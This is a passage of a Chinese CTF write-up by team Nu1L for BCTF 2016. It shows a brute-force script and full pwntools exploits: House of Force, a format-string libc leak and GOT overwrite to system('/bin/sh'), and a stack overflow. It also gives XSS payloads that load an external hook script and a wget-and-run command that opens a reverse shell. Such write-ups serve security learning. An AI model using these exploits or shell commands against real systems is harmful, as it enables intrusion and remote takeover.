0x0000000000815410</p><p>		smalltable6_end = 0x0000000000815448</p><p>		#print "Smalltable address:",hex(ea)</p><p>		if(ea &gt;= smalltable1_start and ea &lt; smalltable1_end):</p><p>			cur_char = (ea - smalltable1_start)/8 + 0x2B</p><p>			next_func = 0x000000000068C0B7</p><p>		elif(ea &gt;= smalltable2_start and ea &lt; smalltable2_end):</p><p>			cur_char = (ea - smalltable2_start)/8 + 0x2B</p><p>			next_func = 0x0000000000685D02</p><p>		elif(ea &gt;= smalltable3_start and ea &lt; smalltable3_end):</p><p>			cur_char = (ea - smalltable3_start)/8 + 0x30</p><p>			next_func = 0x0000000000646DD1</p><p>		elif(ea &gt;= smalltable4_start and ea &lt; smalltable4_end):</p><p>			cur_char = (ea - smalltable4_start)/8 + 0x2B</p><p>			next_func = 0x00000000005B528A</p><p>		elif(ea &gt;= smalltable5_start and ea &lt; smalltable5_end):</p><p>			cur_char = (ea - smalltable5_start)/8 + 0x2B</p><p>			next_func = 0x000000000048D909</p><p>		elif(ea &gt;= smalltable6_start and ea &lt; smalltable6_end):</p><p>			cur_char = (ea - smalltable6_start)/8 + 0x50</p><p>			next_func = 0x0000000000485A2D</p><p>	last_time_str = chr(cur_char) + last_time_str</p><p>	#print last_time_str</p><p>	#print</p><p>	return get_flag(next_func,last_time_str)</p><p>得到了556个flag</p><p>然后利用pwntools来爆破：</p><p>#!/usr/bin/env python2</p><p># -*- coding:utf-8 -*-</p><p>from pwn import *</p><p>import os</p><p>def main():</p><p>	f = open("data3","r")</p><p>	bufs = f.read().split('\n')</p><p>	f.close()</p><p>	buf = bufs[160:]</p><p>	k = 0</p><p>	for i in buf:</p><p>			</p><p>		log.info("running with : " + i)</p><p>		args = ['./toooooo-many-switches.0d37258813df342629a335a35f040be6', i]</p><p>		io = process(args)</p><p>		result = io.recv(99999)</p><p>		print result</p><p>		if 'Congratulatinos' in result:</p><p>			fp = open("flag","w")</p><p>			fp.write(i)</p><p>			fp.close()</p><p>			log.success("FOUND!!!!")</p><p>			print i</p><p>			exit(0)</p><p>		io.close()</p><p>	print len(bufs)</p><p>	return 0</p><p>if __name__ == "__main__":</p><p>	main()</p></code></pre>
</p>
<p>得到正确flag：BCTF{piYqQQ4EjJNs6&lt;wL}</p>
<p>（TAT比FlappyPig慢了一步）</p>
<h2>PWN</h2>
<h3>1.	bcloud(150分)</h3>
<p>放题目顺序不对啊&#8230;拿到这个题目分析之后发现和200漏洞利用方式一样，于是直接搞定了。</p>
<p>原来ruin多的50分是libc hunting的分么&#8230;</p>
</p>
<pre><code><p>#!/usr/bin/env python</p><p># -*- coding: utf-8 -*-</p><p>from pwn import *</p><p>from ctypes import *</p><p># flag = BCTF{3asy_h0uSe_oooof_f0rce}</p><p>#io = process('./bcloud')</p><p>io = remote('104.199.132.199', 1970)</p><p>atoi_got = 0x0804B03C</p><p>printf_plt = 0x080484D0</p><p>libc_ret = 0x19A83</p><p>system_offset = 0x40190</p><p>def s32(x):</p><p>	return c_int32(x).value</p><p>def newnote(length,content):</p><p>	io.recvuntil('&gt;&gt;\n')</p><p>	io.sendline('1')</p><p>	io.recvuntil('\n')</p><p>	io.sendline(str(length))</p><p>	if content != "":</p><p>		io.recvuntil(':')</p><p>		io.send(content)</p><p>	return</p><p>	</p><p>def editnote(id,content):</p><p>	io.recvuntil('option---&gt;&gt;')</p><p>	io.sendline('3')</p><p>	io.recvuntil(':')</p><p>	io.sendline(str(id))</p><p>	io.recvuntil(':')</p><p>	io.send(content)</p><p>	return</p><p>	</p><p>def delnote(id):</p><p>	io.recvuntil('option---&gt;&gt;')</p><p>	io.sendline('4')</p><p>	io.recvuntil(':')</p><p>	io.sendline(str(id))</p><p>	return</p><p>	</p><p>def sync():</p><p>	io.recvuntil('option---&gt;&gt;')</p><p>	io.sendline('5')</p><p>	return</p><p>def main():</p><p>	name = 64 * '\xff'</p><p>	io.recvuntil('name:')</p><p>	io.send(name)</p><p>	io.recvuntil(' ')</p><p>	buf = io.recvuntil('!')[:-1].lstrip('\xff')</p><p>	heap_addr = u32(buf+(4-len(buf))*'\x00')</p><p>	log.info('Heap address = ' + hex(heap_addr))</p><p>	</p><p>	org = 64 * '\xff'</p><p>	io.recvuntil('Org:')</p><p>	io.send(org)</p><p>	</p><p>	host = 64 * '\xff'</p><p>	io.recvuntil('Host:')</p><p>	io.send(host)</p><p>	</p><p>	top = heap_addr - 8 + 0x48 + 0x48 + 0x48</p><p>	size = atoi_got - 8 - top - 4 - 8;</p><p>	newnote(s32(size),"")</p><p>	newnote(32,"A"*4+p32(printf_plt)+'\n')</p><p>	</p><p>	io.recvuntil('-&gt;&gt;')</p><p>	io.sendline('aaaaaa%31$p')</p><p>	io.recvuntil('0x')</p><p>	buf = int(io.recvuntil("I")[:-1],16)</p><p>	libc_base = buf - libc_ret</p><p>	log.success("Libc base = " + hex(libc_base))</p><p>	system_addr = libc_base + system_offset</p><p>	</p><p>	io.recvuntil('-&gt;&gt;')</p><p>	io.sendline('aaa')</p><p>	io.recvuntil(':')</p><p>	io.sendline('a')</p><p>	io.recvuntil(':')</p><p>	io.sendline("A"*4+p32(system_addr))</p><p>	</p><p>	io.sendline("/bin/sh")</p><p>	#newnote(-1,"")</p><p>	</p><p>	io.interactive()</p><p>	return 0</p><p>if __name__ == '__main__':</p><p>	main()</p></code></pre>
</p>
<h3>2.	ruin(200分)</h3>
<p>拿到题目，分析程序，发现在edit_secret处有溢出，可以覆盖top块的size，于是想到了malloc maleficarum这篇文章中提到的House Of Force方法。修改top的size为0xffffffff，就可以申请无限大内存块，使top块下一次分配到任意位置的堆块。在程序开头处输入key的地方可以泄露堆地址，于是就可以过掉aslr，通过计算申请到.got.plt处的堆块。</p>
<p>接下来就是麻烦的地方了，题目没有给libc，无法得知system的偏移，于是把atoi的plt改成printf，利用fsb来dump libc，得到system偏移，然后就ok了。</p>
<p><b>脚本：</b></p>
</p>
<pre><code><p>#!/usr/bin/env python2</p><p># -*- coding:utf-8 -*-</p><p>from pwn import *</p><p>from ctypes import *</p><p># flag = BCTF{H0w_3lf_Ru1n3d_XmaS}</p><p>atoi_got = 0x10F80</p><p>printf_plt = 0x00008594</p><p>libc_ret_off = 0x76e3381c - 0x76e1c000</p><p>libc_system = 0x3a230</p><p>#io = remote('127.0.0.1', 33334)</p><p>io = remote('166.111.132.49', 9999)</p><p>def s32(x):</p><p>	return c_int32(x).value</p><p>	</p><p>def us32(x):</p><p>	return c_uint32(x).value</p><p>def keys(content):</p><p>	io.recvuntil('choice(1-4):')</p><p>	io.sendline('1')</p><p>	io.recvuntil('key:')</p><p>	io.send(content)</p><p>	return</p><p>def sign_name(length,content=''):</p><p>	print io.recvuntil('choice(1-4):')</p><p>	io.sendline('3')</p><p>	print io.recvuntil('length:')</p><p>	io.sendline(str(length))</p><p>	if content != '':</p><p>		print io.recvuntil('name:')</p><p>		io.send(content)</p><p>	return</p><p>def edit_secret(secret):</p><p>	io.recvuntil('choice(1-4):')</p><p>	io.sendline('2')</p><p>	io.recvuntil('secret:')</p><p>	io.sendline(secret)</p><p>	return</p><p>	</p><p>def leak(address):</p><p>	log.info('Address = '+hex(address))</p><p>	if '\x0a' in p32(address):</p><p>		return '\x00'</p><p>	fsb = r'%8$s' + 6*'a' + 2*'\x00' + p32(address)</p><p>	fsb += '\n'</p><p>	print fsb.encode('hex')</p><p>	print io.recvuntil('choice(1-4):')</p><p>	io.send(fsb)</p><p>	</p><p>	data = io.recvuntil('aaaaaa')</p><p>	print data</p><p>	data = data[:-6]</p><p>	print data.encode('hex')</p><p>	return data + '\x00'</p><p>def pwn(offset):</p><p>	io.recvuntil('key:')</p><p>	io.send('aaaaaaaa')</p><p>	buf = io.recvuntil(' ')[:-1] 	# heap address</p><p>	io.recvuntil('key:')</p><p>	io.send('security')</p><p>	buf.encode('hex')</p><p>	heap_1 = u32(buf[8:] + (4-len(buf[8:]))*'\x00')</p><p>	log.success('Heap Address = ' + hex(heap_1))</p><p>	</p><p>	top = heap_1 + 8</p><p>	size = atoi_got - 8 - top - 4</p><p>	log.info('Size = ' + hex(us32(size)))</p><p>	</p><p>	edit_secret('a'*8+'\x00\x00\x00\x00'+'\xff\xff\xff\xff') 	# edit top's chunksize</p><p>	sign_name(s32(size)) # now we can overwrite atoi's got</p><p>	payload = p32(printf_plt)</p><p>	payload = payload + (16-len(payload))*'C'</p><p>	keys(payload)</p><p>	# %21$p = libc_start_main_ret</p><p>	io.recvuntil('choice(1-4):')</p><p>	io.sendline(r'%21$p')</p><p>	addr = int((io.recvline()[:-1])[2:],16)</p><p>	log.info('Libc_start_main_ret = ' + hex(addr))</p><p>	</p><p>	</p><p>	libc_base = addr - libc_ret_off</p><p>	log.info('Libc Base = ' + hex(libc_base))</p><p>	system_addr = libc_base + libc_system</p><p>	log.success('System = ' + hex(system_addr))</p><p>	io.recvuntil('choice(1-4):')</p><p>	io.sendline('')</p><p>	io.recvuntil('key:')</p><p>	io.send(p32(system_addr)+12*'a')</p><p>	</p><p>	io.recvuntil('choice(1-4):')</p><p>	io.sendline('/bin/sh\x00')</p><p>	'''</p><p>	p = libc_base</p><p>	f = open('libc_dump.bin', 'wb')</p><p>	while 1:</p><p>		buf = leak(p)</p><p>		f.write(buf)</p><p>		p += len(buf)</p><p>	f.close()</p><p>	'''</p><p>	io.interactive()</p><p>	'''</p><p>	</p><p>	</p><p>	# guess system's address</p><p>	system_addr = addr + 0x10000 + offset</p><p>	log.info('Guessed addr = ' + hex(system_addr))</p><p>	io.recvuntil('choice(1-4):')</p><p>	io.sendline('')</p><p>	io.recvuntil('key:')</p><p>	io.send(p32(system_addr)+12*'a')</p><p>	</p><p>	io.recvuntil('choice(1-4):')</p><p>	io.sendline('id')</p><p>	buf = io.recv(9999)</p><p>	'''</p><p>	'''</p><p>	dyn = DynELF(leak,elf=ELF('./ruin'))</p><p>	system = dyn.lookup('system', 'libc')</p><p>	log.success('System addr = ' + hex(system))</p><p>	'''</p><p>	return</p><p>if __name__ == '__main__':</p><p>	try:</p><p>		pwn(0)</p><p>	except Exception, e:</p><p>		io.interactive()</p></code></pre>
</p>
<h3>3.	happygirlsday(350分)</h3>
<p><b>Part1：</b></p>
<p>happygirlsday (exploit&amp;misc 350)</p>
<p><b>流水账部分</b></p>
<p>拿到赛题文件就各种试。</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591427406106.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="208" width="575"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591427406106.png!small" height="208" width="575"></p></noscript>
<p>查看文件头</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/1459142744851.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="157" width="565"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/1459142744851.png!small" height="157" width="565"></p></noscript>
<p>文件头是0xC0DEF00D。<a href="https://github.com/thomas0809/os/blob/8cc5476c844bff8eb631bcf599fbf5d9632263e5/lec2/01-3-lab0-spoc-discussion.md" target="_blank">Github.com</a>搜索0xC0DEF00D，得到。</p>
<p>怀疑是v9-cpu。然后搭环境试验（<a href="https://github.com/chyyuu/v9-cpu">https://github.com/chyyuu/v9-cpu</a>）。</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591427695805.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="142" width="577"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591427695805.png!small" height="142" width="577"></p></noscript>
<p>与nc 104.199.132.199 2666的效果一致。</p>
<p>下一步目标是搭建调试环境，逆向分析，找漏洞。</p>
<p><b>指令集学习</b></p>
</p>
<p><a href="https://github.com/chyyuu/v9-cpu/blob/master/doc/cpu.md" target="_blank">https://github.com/chyyuu/v9-cpu/blob/master/doc/cpu.md</a>反汇编</p>
<p>	使用 ./dis 命令得到反汇编代码。</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591427918983.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="72" width="483"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591427918983.png!small" height="72" width="483"></p></noscript>
<p><b>调试器</b></p>
<p>	使用 ./xem -g进行调试。</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591428003027.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="85" width="493"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591428003027.png!small" height="85" width="493"></p></noscript>
<p><b>断点功能</b></p>
<p>通过修改em.c代码，为调试器添加“断点”功能。</p>
<p><b>逆向分析：</b></p>
<p>阅读./dis 得到happygirlsday的反汇编代码，根据寻址特征，修改了反汇编结果中的call labelxx部分，并参照/v9-cpu/blob/master/doc/cpu.md 以及v9-cpu/root/usr/os/下的代码os2.c,os5.c。识别了赛题文件的绝大多数‘系统’函数。</p>
<p>赛题文件反汇编结果。</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591428062604.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="131" width="311"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591428062604.png!small" height="131" width="311"></p></noscript>
<h2>Os5.c部分代码</h2>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/145914281971.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="148" width="377"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/145914281971.png!small" height="148" width="377"></p></noscript>
<p>赛题文件的大致流程分为两部分。</p>
<p>第一部分为程序读取用户输入，将input转换成index，屏幕输出字符串stringtable[index]。</p>
<p><b>	转换的核心算法为：</b></p>
</p>
<pre><code><p>def getindex(str):</p><p>	 &nbsp; &nbsp;str_len=len(str)</p><p>	 &nbsp; &nbsp;sum=0</p><p>&nbsp;	 &nbsp; &nbsp;for i in &nbsp;range(str_len):</p><p>	 &nbsp; &nbsp; &nbsp; &nbsp;sum=sum+i*ord(str[i:i+1])</p><p>	 &nbsp; &nbsp;return sum%0x14</p></code></pre>
</p>
<p>第二部分大致流程为根据用户传入字符串转换后的index，决定是否进入有问题的代码段。</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/1459142834612.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="117" width="483"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/1459142834612.png!small" height="117" width="483"></p></noscript>
<p>剩下的部分交给队友了！</p>
<h3>Part &nbsp;2</h3>
<p>	这题目多亏了队友们的帮助&#8230;</p>
<p>下载附件，发现不是elf格式的文件，看到文件头有c0def00d的标志，猜测是某种虚拟环境的可执行文件。队友在<a href="https://github.com/chyyuu/v9-cpu " target="_blank">github</a>找到了。</p>
<p>接下来就是分析了，队友基本上把整个框架逆了出来，我直接看他分析出来的，发现在三次输入字符串计算出来的索引为5,2,0的情况下可以触发一个栈溢出。而字符串索引的计算方式为：</p>
<p>index = sum(i*a[i])%0&#215;14，利用这个栈溢出直接把内存里的flag 打印出来就ok。</p>
<p><b>脚本：</b></p>
</p>
<pre><code><p>#!/usr/bin/env python</p><p># -*- coding: utf-8 -*-</p><p>from pwn import *</p><p># flag = BCTF{LOVES_Be4ut1ful}</p><p>io = remote('104.199.132.199', 2666)</p><p>#io = process(['/home/arch/tools/v9-cpu/xem','happygirlsday'])</p><p>payload1 = 'AA'</p><p>payload2 = '&gt;&gt;'</p><p>stack_overflow_xxx = 30*'a' + p32(0x00000758) + p32(0) + p32(0xe18) + p32(0x0) + p32(0xe18) + p32(0)</p><p>def sendmsg(x):</p><p>	print io.recvuntil('something:')</p><p>	io.sendline(x)</p><p>	return</p><p>def main():</p><p>	sendmsg(payload1)</p><p>	sendmsg(payload2)</p><p>	print io.recvuntil('me?')	# here exploit</p><p>	io.sendline(stack_overflow_xxx)</p><p>	io.interactive()</p><p>	return 0</p><p>if __name__ == '__main__':</p><p>	main()</p></code></pre>
</p>
<h2>WEB</h2>
<h3>1.	QAQ(350分)</h3>
<p>Web狗的末日ctf，竟然只有两个web。</p>
<p>留言板处有XSS。 Firefox可以使用iFrame srcdoc+实体编码绕过。</p>
<pre><code>&lt;iframe srcdoc="&lt;script src=http://xxxx:3000/hook.js&gt;&lt;/script&gt;"&gt;</code></pre>
<p>Chrome可以使用link标签引入外部html+利用filter特性绕过。（只有在chrome下可行）</p>
<pre><code>&lt;link rel="import" href="http://1.xxxx.sinaapp.com&amp;sol;iponclick1.php" /&gt;</code></pre>
<p>打到Cookie发现并没有什么egg use，登陆还有基础认证，于是果断上Beef。</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591428845231.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="356" width="554"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591428845231.png!small" height="356" width="554"></p></noscript>
<p>尝试读了页面源码，和 4dmin 目录，并没有发现什么。 hint说在内网有秘♂密。 于是利用webrtc读了一波ip，发现内网地址172.17.0.1 。 hint表示有CORS头。 于是用Rider试试看访问同一网段下的内网服务器。</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591428872423.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="384" width="554"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591428872423.png!small" height="384" width="554"></p></noscript>
<p>运气不错，172.17.0.2就有神奇的东西。 ob_start的callback被设置成了system，于是直接访问</p>
<p><a href="http://172.17.0.2/?c=ls">http://172.17.0.2/?c=ls</a> 就可以执行命令了。 ls了一下发现什么都没有，想了想还是弹个shell好了。</p>
<blockquote><p><span style="color: rgb(239, 71, 71);">c=wget%20<a href="http://1.xxxxx.sinaapp.com/back.py">http://1.xxxxx.sinaapp.com/back.py</a></span></p>
<p><span style="color: rgb(239, 71, 71);">c=python%20back.py%204.3.2.1%201234</span></p>
</blockquote>
<p>顺利弹回。GetFlag &nbsp;</p>
<p style="text-align: center;"><img alt="Clipboard Image.png" data-original="http://image.3001.net/images/20160328/14591428974715.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" height="199" width="512"></p>
<noscript><img alt="Clipboard Image.png" src="http://image.3001.net/images/20160328/14591428974715.png!small" height="199" width="512"></p></noscript>
<p><b style="color: rgb(239, 71, 71);">*原创作者：Nu1L团队，本文属FreeBuf原创奖励计划，未经许可禁止转载</b></p>
                                                    </div>
                        <div class="article-oper article-oper-new">
                            <style>
                                @font-face {font-family: 'iconfont';
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot'); /* IE9*/
                                    src: url('http://static.3001.net/iconfonts/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
                                    url('http://static.3001.net/iconfonts/iconfont.woff') format('woff'), /* chrome、firefox */
                                    url('http://static.3001.net/iconfonts/iconfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
                                    url('http://static.3001.net/iconfonts/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
                                }
                            </style>
                            <div class="share-new clearfix">
                                <div class="share-author">
                                                                            <a href="http://www.freebuf.com/author/lyuchen65" title="由 lyuchen65 发布" rel="author">
                                            <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png" width="50" height="50" alt="" class="avatar avatar-50 wp-user-avatar wp-user-avatar-50 photo avatar-default" />                                            <!--							<img src="http://image.3001.net/2015/06/17.jpg" alt="ArthurKiller">-->
                                        </a>
                                        <div class="share-author-info">
                                                                                        <a class="author-name" href="http://www.freebuf.com/author/lyuchen65">lyuchen65</a>
                                            <!--<span class="icon-f"></span>-->
                                            <span>
                                <i class="colour-red">
                                    5                                </i>
                                篇文章</span>
                                            <span>等级：
                                <i class="colour-green">3</i>级
                            </span>
                                        </div>
                                                                                                        </div>
                                <div class="user-center clearfix">
                                                                            <a href="http://www.freebuf.com/author/lyuchen65" data-toggle="tooltip" data-placement="top" title="个人主页" class="home" target="_blank"></a>
                                                                        <a href="http://www.freebuf.com/user/pm?pmaction=newmessage&to=lyuchen65" data-toggle="tooltip" data-placement="top" title="私信" class="letter" target="_blank"></a>
                                </div>
                                <div class="share-ctrl clearfix">
                                                                        <div class="bdsharebuttonbox clearfix bdshare-button-style1-24 columnstatus"
                                         data-bd-bind="1489991449190" data-column="" data-title="BCTF解题报告" data-name="">
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="tsina" title="分享到新浪微博" id="tsina"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="weixin" title="分享到微信" id="weixin"></a>
                                        <a href="#" data-toggle="tooltip" data-placement="top" data-cmd="qzone" title="分享到QQ空间" id="qzone"></a>
                                       <!-- _shareUrlWeibo = 'http://service.weibo.com/share/share.php?url=http://'+encodeURIComponent(_json[i].url)+'&title='+encodeURIComponent(_json[i].title)+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareUrlZone = 'http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://'+encodeURIComponent(_json[i].url)+'&title='+_json[i].title+'-FreeBuf涓撴爮路'+_json[i].columnName;
                                        _shareSrc = 'http://s.jiathis.com/qrcode.php?url=http://'+_json[i].url;-->
                                        <span class="share-line">|</span>
                                    </div>
                                </div>
                                <div class="user-ctrl clearfix">
                                                                            <a href="http://www.freebuf.com/oauth" id="collect" data-toggle="tooltip" data-placement="top" title="收藏" ></a>
                                                                        <a href="#respond" data-toggle="tooltip" data-placement="top" title="评论" id="comments"></a>
                                                                        <!--					<a href="#" title="文章纠正">&#xe6e3;</a>-->
                                    <span class="share-line">|</span>
                                    <span class="info-alert"></span>
                                </div>
                            </div>
                            <script>
                                var column = $('.columnstatus').attr('data-column');
                                var text = '';
                                if(column){
                                    var title = $('.columnstatus').attr('data-title');
                                    var name = $('.columnstatus').attr('data-name');
                                    text = title+' - FreeBuf专栏·'+name;
                                }
                                window._bd_share_config={
                                    "common": {
                                        "bdSnsKey": {},
                                        "bdText": text,
                                        "bdMini": "2",
                                        "bdMiniList": ["qzone", "tsina", "weixin"],
                                        "bdPic": "",
                                        "bdStyle": "1",
                                        "bdSize": "24"
                                    },
                                    "share":{},
                                };
                                with(document)0[
                                    (getElementsByTagName('head')[0]||body).
                                    appendChild(createElement('script')).
                                        src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)
                                    ];
                                //控制垂直方向分享模块的定位
                                function shareFixVertical(){
                                    var offsetTop = jQuery(".article-oper").get(0).offsetTop;
                                    var win_h = jQuery(window).height();
                                    var win_w = jQuery(window).width();
                                    var scrollTop = document.body.scrollTop||document.documentElement.scrollTop;
                                    var _height = offsetTop-scrollTop;
                                    var _flag = $('.column-article').attr('data-column');
                                    if(_flag == 1) {
                                        if(_height>=win_h-660&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }else {
                                        if(_height>=win_h-255&&win_w>975){
                                            var _width = jQuery("#getWidth").innerWidth()-30;
                                            var _left = jQuery("#getWidth").offset().left+15;
                                            jQuery(".share-new").addClass("fixed");
                                            jQuery(".fixed").css({
                                                width:_width,
                                                left:_left
                                            });

                                        }else{
                                            jQuery(".share-new").removeClass("fixed");
                                            jQuery(".share-new").css({
                                                width: "100%"
                                            });
                                        }
                                    }
                                }
                                //控制水平方向分享模块的定位
                                function shareFixHorizontal(){
                                    var _width = jQuery("#getWidth").innerWidth()-30;
                                    var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                    var win_w = document.documentElement.clientWidth || document.body.clientWidth;
                                    jQuery(".fixed").css({
                                        width:_width,
                                        left:_left
                                    });
                                    if(win_w< 975){
                                        jQuery(".share-new").css({
                                            width: "100%",
                                            left: "0"
                                        });
                                    }else{
                                        var _width = jQuery("#getWidth").innerWidth()-30;
                                        var _left = jQuery("#getWidth").get(0).offsetLeft+15;
                                        jQuery(".fixed").css({
                                            width:_width,
                                            left:_left
                                        });
                                    }
                                }
                                function click(){
                                    var _w = jQuery(window).width();
                                    jQuery(document).click(function(e){
                                        if(jQuery(e.target).attr("id")=="weixin"){
                                            if(_w <= 760) {
                                                jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                                layer.open({
                                                    title: '提示',
                                                    btnAlign: 'c',
                                                    content: '请使用手机浏览器自带的分享功能分享该页面',
                                                    area: '260px'
                                                });
                                            }else {
                                                jQuery("#bdshare_weixin_qrcode_dialog").show();
                                            }
                                        }else {
                                            jQuery("#bdshare_weixin_qrcode_dialog").hide();
                                        }
                                    });
                                }

                                jQuery(window).on("load",function(){
                                    shareFixVertical();
                                    click();
                                });

                                jQuery(window).on("scroll",function(){
                                    //判断滚轮方向
                                    var agent = navigator.userAgent;
                                    if (/.*Firefox.*/.test(agent)) {
                                        document.addEventListener("DOMMouseScroll", function(e) {
                                            e = e || window.event;
                                            var detail = e.detail;
                                            if (detail > 0) {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            } else {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            }
                                        });
                                    } else {
                                        document.onmousewheel = function(e) {
                                            e = e || window.event;
                                            var wheelDelta = e.wheelDelta;
                                            if (wheelDelta > 0) {
                                                shareFixVertical();
                                                $('.main-header .header').removeClass('op0');
                                                $('.main-header .header').addClass('op1');
                                            } else {
                                                $(".share-new").removeClass("fixed");
                                                $(".share-new").css({
                                                    width: "100%"
                                                });
                                                $('.main-header .header').removeClass('op1');
                                                $('.main-header .header').addClass('op0');
                                            }
                                        }
                                    }
                                });


                                jQuery(window).on("resize",function(){
                                    shareFixHorizontal();
                                    click();
                                })

                                //tooltips提示
                                $(function () { $("[data-toggle='tooltip']").tooltip(); });
                            </script>
                        </div>
                                                                                                                            <div class="article-pager ">
                                <ul>
                                    <li class="previous"><span>上一篇：</span><a href="http://www.freebuf.com/news/topnews/100257.html" rel="prev">【信息安全创投巡礼】苹果天使基金：我们为什么专注于信息安全领域投资？</a>                                    </li>
                                    <li class="next"><span>下一篇：</span>
                                        <a href="http://www.freebuf.com/articles/web/100386.html" rel="next">Petya敲诈木马拆解</a>                                    </li>
                                </ul>
                            </div>
                                            </div>
                </div>
                <div class="comment-list">
      <div class="main-tit02">
		<a rel="nofollow" class="btnbtn-default btn-comment" href="#respond">发表评论</a>
        <h3>已有 <span class="color_red">6</span> 条评论
      </div>
      <ul>
         <li class="comment even thread-even depth-1" id="li-comment-181049">
    <div id="comment-181049">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic7.png">     </div>
    <div class="tit"> 
	    <span class="name"> 深圳以北 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2016-03-30</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-181049','181049', 'respond','100143' ) " href="?replytocom=181049#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">1楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>一楼膜拜大神</p>
<div class="comment-tools">
<div class="vote" id="vote-181049"><span id="acv_stat_181049"></span><a class="ilike_icon"  id="vote4-181049" href="javascript:acv_vote(181049,1);">亮了</a>(<span id="cos_support-181049">3</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="181049" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="181049" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="181049" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="181049" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="181049" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
<li class="comment byuser comment-author-amaya odd alt thread-odd thread-alt depth-1" id="li-comment-181065">
    <div id="comment-181065">
        <div class="photo"> <a href="http://www.freebuf.com/author/amaya">
    <img src="http://image.3001.net/2016/01/QQ图片20160129181840.jpg"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/amaya" target="_blank">amaya&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(4级)</span>
				<span class="explain"> 给我五包辣条
今晚我就是你的 </span>
		<span class="time">&nbsp;2016-03-30</span>
		<span class="time">
                    </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
